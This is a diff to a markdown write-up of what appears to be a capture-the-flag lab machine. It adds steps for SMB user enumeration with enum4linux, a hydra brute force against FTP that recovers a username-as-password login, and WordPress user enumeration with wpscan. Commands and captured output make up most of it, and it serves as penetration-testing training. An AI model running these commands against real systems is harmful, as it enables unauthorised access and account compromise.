@@ -463,6 +463,148 @@ local_root=/etc
 ...[snip]...
 ```
 
+Executed enum4linux to perform automated, deep SMB enumeration and targeted user harvesting.
+
+```
+enum4linux -a 10.101.85.17 > enum4linux.txt
+```
+
+The scan successfully extracted the password policy parameters and enumerated a comprehensive list of valid local Unix system users via RID cycling.
+
+```
+┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
+└─$ cat enum4linux.txt       
+...[snip]...
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                         
+                                                                                                                    
+S-1-22-1-1000 Unix User\peter (Local User)                                                                          
+S-1-22-1-1001 Unix User\RNunemaker (Local User)
+S-1-22-1-1002 Unix User\ETollefson (Local User)
+S-1-22-1-1003 Unix User\DSwanger (Local User)
+S-1-22-1-1004 Unix User\AParnell (Local User)
+S-1-22-1-1005 Unix User\SHayslett (Local User)
+S-1-22-1-1006 Unix User\MBassin (Local User)
+S-1-22-1-1007 Unix User\JBare (Local User)
+S-1-22-1-1008 Unix User\LSolum (Local User)
+S-1-22-1-1009 Unix User\IChadwick (Local User)
+S-1-22-1-1010 Unix User\MFrei (Local User)
+S-1-22-1-1011 Unix User\SStroud (Local User)
+S-1-22-1-1012 Unix User\CCeaser (Local User)
+S-1-22-1-1013 Unix User\JKanode (Local User)
+S-1-22-1-1014 Unix User\CJoo (Local User)
+S-1-22-1-1015 Unix User\Eeth (Local User)
+S-1-22-1-1016 Unix User\LSolum2 (Local User)
+S-1-22-1-1017 Unix User\JLipps (Local User)
+S-1-22-1-1018 Unix User\jamie (Local User)
+S-1-22-1-1019 Unix User\Sam (Local User)
+S-1-22-1-1020 Unix User\Drew (Local User)
+S-1-22-1-1021 Unix User\jess (Local User)
+S-1-22-1-1022 Unix User\SHAY (Local User)
+S-1-22-1-1023 Unix User\Taylor (Local User)
+S-1-22-1-1024 Unix User\mel (Local User)
+S-1-22-1-1025 Unix User\kai (Local User)
+S-1-22-1-1026 Unix User\zoe (Local User)
+S-1-22-1-1027 Unix User\NATHAN (Local User)
+S-1-22-1-1028 Unix User\www (Local User)
+S-1-22-1-1029 Unix User\elly (Local User)
+
+ ===============================( Getting printer info for 10.101.85.17 )===============================
+                                                                                                                    
+No printers returned.                                                                                               
+
+
+enum4linux complete on Mon May 25 04:57:48 2026
+```
+
+Save them as users.txt
+
+```
+peter
+RNunemaker
+ETollefson
+DSwanger
+AParnell
+SHayslett
+MBassin
+JBare
+LSolum
+IChadwick
+MFrei
+SStroud
+CCeaser
+JKanode
+CJoo
+Eeth
+LSolum2
+JLipps
+jamie
+Sam
+Drew
+jess
+SHAY
+Taylor
+mel
+kai
+zoe
+NATHAN
+www
+elly
+```
+
+---
+
+## Exploitation
+
+### FTP Port 21 brute-forcing
+
+Brute-forced the FTP service using the extracted user list.
+
+```
+hydra -L users.txt -P users.txt ftp://10.101.85.17
+```
+
+text
+
+```
+┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
+└─$ hydra -L users.txt -P users.txt ftp://10.101.85.17
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-25 05:13:53
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 900 login tries (l:30/p:30), ~57 tries per task
+[DATA] attacking ftp://10.101.85.17:21/
+[21][ftp] host: 10.101.85.17   login: SHayslett   password: SHayslett
+[STATUS] 298.00 tries/min, 298 tries in 00:01h, 602 to do in 00:03h, 16 active
+[STATUS] 292.33 tries/min, 877 tries in 00:03h, 23 to do in 00:01h, 16 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-25 05:17:01
+```
+
+```
+ftp 10.101.85.17
+SHayslett
+SHayslett
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---
+
+<!-- 
 ---
 
 ### Nmap 2
@@ -542,6 +684,10 @@ The scan encountered unusual response headers and failed to fully enumerate the 
 + [600050] Apache/2.4.18 appears to be outdated (current is at least 2.4.66).
 ```
 
+---
+
+### Nikto 2
+
 Rescanned port 12380 with the -ssl flag to force an encrypted connection.
 
 ```
@@ -590,13 +736,13 @@ The SSL scan completed successfully, exposing an SSL certificate registered to "
 + 1 host(s) tested
 ```
 
-text
+Accessed the robots.txt file on port 12380 to find disallowed web directories.
 
 ```
 https://10.101.85.17:12380/robots.txt
 ```
 
-text
+The file contents revealed two restricted directories: /admin112233/ and /blogblog/.
 
 ```
 User-agent: *
@@ -604,22 +750,104 @@ Disallow: /admin112233/
 Disallow: /blogblog/
 ```
 
-text
+Investigated the restricted /admin112233/ directory to check for administrative panels.
 
 ```
 https://10.101.85.17:12380/admin112233/
 ```
 
-Nothing
+The directory redirected to an unrelated external website via a popup, yielding no useful administrative information.
 
 ![](./images/02.png)
 
-text
+Investigated the restricted /blogblog/ directory to identify the main web application.
 
 ```
 https://10.101.85.17:12380/blogblog/
 ```
 
-It is Initech Home Page
+The directory successfully loaded the Initech home page, which is running on top of a WordPress platform.
 
 ![](./images/03.png)
+
+---
+
+### Wpscan
+
+Executed wpscan with user enumeration enabled to harvest valid WordPress accounts.
+
+```
+wpscan --url https://10.101.85.17:12380/blogblog/ --disable-tls-checks --no-update -e u
+```
+
+text
+
+```                                                                                                                   
+┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
+└─$ wpscan --url https://10.101.85.17:12380/blogblog/ --disable-tls-checks --no-update -e u
+...[snip]...
+
+[i] User(s) Identified:
+
+[+] 
+ | Found By: Author Posts - Display Name (Passive Detection)
+
+[+] kathy
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] John Smith
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By: Rss Generator (Passive Detection)
+
+[+] heather
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] john
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] elly
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] peter
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] barry
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] garry
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] harry
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] scott
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] tim
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Mon May 25 04:35:05 2026
+[+] Requests Done: 73
+[+] Cached Requests: 6
+[+] Data Sent: 20.645 KB
+[+] Data Received: 323.377 KB
+[+] Memory used: 199.871 MB
+[+] Elapsed time: 00:00:04
+
+``` -->
